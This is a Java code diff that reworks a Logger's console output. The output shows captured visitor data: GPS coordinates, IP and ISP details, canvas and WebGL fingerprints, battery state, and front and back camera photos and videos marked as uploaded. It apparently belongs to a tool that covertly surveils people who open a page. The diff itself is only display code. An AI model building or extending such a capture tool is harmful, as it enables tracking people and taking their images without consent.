@@ -196,11 +196,17 @@ public final class Logger {
         SummaryBuilder.append(AnsiColor.Reset);
         System.out.println(SummaryBuilder);
 
-        PrintCaptureSection("DEVICE",   Data, new String[]{"OsName", "OsVersion", "BrowserName", "BrowserVersion", "DeviceType", "ScreenResolution", "Language", "Timezone", "DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "CookieEnabled", "PixelRatio"});
-        PrintCaptureSection("NETWORK",  Data, new String[]{"IpAddress", "ISP", "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "OnlineStatus", "PageUrl", "Referrer"});
-        PrintCaptureSection("LOCATION", Data, new String[]{"Country", "Region", "City", "GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude"});
-        PrintCaptureSection("CAMERA",   Data, new String[]{"CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"});
-        PrintCaptureSection("MISC",     Data, new String[]{"BatteryLevel", "BatteryCharging", "Timestamp"});
+        PrintCaptureSection("DEVICE",      Data, new String[]{"OsName", "OsVersion", "DeviceType", "DeviceBrand", "DeviceModel", "Platform"});
+        PrintCaptureSection("BROWSER",     Data, new String[]{"BrowserName", "BrowserVersion", "Language", "LanguagesSupported", "VendorName", "DoNotTrack", "CookieEnabled", "PdfViewerEnabled", "PluginCount", "HistoryLength", "DocumentReadyState"});
+        PrintCaptureSection("DISPLAY",     Data, new String[]{"ScreenResolution", "ScreenAvailable", "ViewportSize", "ColorDepth", "PixelRatio", "OrientationType", "OrientationAngle"});
+        PrintCaptureSection("HARDWARE",    Data, new String[]{"DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "VideoInputCount", "AudioInputCount", "AudioOutputCount", "AudioContextSampleRate", "AudioContextChannelCount"});
+        PrintCaptureSection("NETWORK",     Data, new String[]{"IpAddress", "ISP", "Organization", "AsNumber", "IsMobile", "IsProxy", "IsHosting", "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "NetworkRtt", "SaveData", "OnlineStatus", "PageUrl", "Referrer", "Timezone", "IpTimezone"});
+        PrintCaptureSection("LOCATION",    Data, new String[]{"Country", "Region", "City", "GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude", "GpsAltitudeAccuracy", "GpsHeading", "GpsSpeed"});
+        PrintCaptureSection("BATTERY",     Data, new String[]{"BatteryLevel", "BatteryCharging", "BatteryChargingTime", "BatteryDischargingTime"});
+        PrintCaptureSection("FEATURES",    Data, new String[]{"ServiceWorkerSupported", "IndexedDbSupported", "WebAssemblySupported", "WebRtcSupported", "GamepadApiSupported", "PaymentRequestSupported", "BluetoothAvailable", "UsbAvailable", "SpeechSynthesisAvailable", "SpeechRecognitionAvailable", "NotificationPermission"});
+        PrintCaptureSection("FINGERPRINT", Data, new String[]{"CanvasFingerprint", "WebGlSupported", "WebGl2Supported", "WebGlRenderer", "WebGlVendor", "StorageQuotaMb", "StorageUsedMb"});
+        PrintCaptureSection("CAMERA",      Data, new String[]{"CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"});
+        PrintCaptureSection("MISC",        Data, new String[]{"Timestamp"});
     }
 
     private static void PrintCaptureSection(String SectionName, Map<String, String> Data, String[] Keys) {
@@ -219,11 +225,33 @@ public final class Logger {
             String Label = Entry.getKey();
             String Value = Entry.getValue();
             String ValueColor = AnsiColor.BrightWhite;
-            if (Label.equals("GpsLatitude") || Label.equals("GpsLongitude"))                            ValueColor = AnsiColor.Cyan;
-            else if (Label.equals("IpAddress"))                                                         ValueColor = AnsiColor.Orange;
-            else if ((Label.equals("CameraVideoFile") || Label.equals("CameraVideoBackFile")) && Value.equals("Uploaded")) ValueColor = AnsiColor.BrightMagenta;
-            else if (Label.startsWith("Camera") && Value.equals("Uploaded"))                            ValueColor = AnsiColor.BrightGreen;
-            else if (Label.startsWith("Camera") && Value.contains("Denied"))                            ValueColor = AnsiColor.BrightRed;
+            if (Label.equals("GpsLatitude") || Label.equals("GpsLongitude")) {
+                ValueColor = AnsiColor.Cyan;
+            } else if (Label.equals("IpAddress")) {
+                ValueColor = AnsiColor.Orange;
+            } else if ((Label.equals("CameraVideoFile") || Label.equals("CameraVideoBackFile")) && Value.equals("Uploaded")) {
+                ValueColor = AnsiColor.BrightMagenta;
+            } else if (Label.startsWith("Camera") && Value.equals("Uploaded")) {
+                ValueColor = AnsiColor.BrightGreen;
+            } else if (Label.startsWith("Camera") && (Value.contains("Denied") || Value.contains("Failed"))) {
+                ValueColor = AnsiColor.BrightRed;
+            } else if ((Label.equals("IsProxy") || Label.equals("IsHosting")) && Value.equals("true")) {
+                ValueColor = AnsiColor.BrightRed;
+            } else if (Value.equals("true")) {
+                ValueColor = AnsiColor.BrightGreen;
+            } else if (Value.equals("false")) {
+                ValueColor = AnsiColor.BrightBlack;
+            } else if (Value.contains("Permission Denied") || Value.contains("Lookup Failed") || Value.contains("Failed")) {
+                ValueColor = AnsiColor.BrightRed;
+            } else if (Label.equals("ISP") || Label.equals("Organization") || Label.equals("AsNumber")) {
+                ValueColor = AnsiColor.Yellow;
+            } else if (Label.equals("Country") || Label.equals("City") || Label.equals("Region")) {
+                ValueColor = AnsiColor.White;
+            } else if (Label.equals("CanvasFingerprint") || Label.equals("WebGlRenderer") || Label.equals("WebGlVendor")) {
+                ValueColor = AnsiColor.Magenta;
+            } else if (Label.equals("BatteryLevel")) {
+                ValueColor = AnsiColor.BrightGreen;
+            }
             System.out.println("    " + AnsiColor.BrightBlack + PadRight(Label, LabelWidth) + "  "
                     + ValueColor + Value + AnsiColor.Reset);
         }
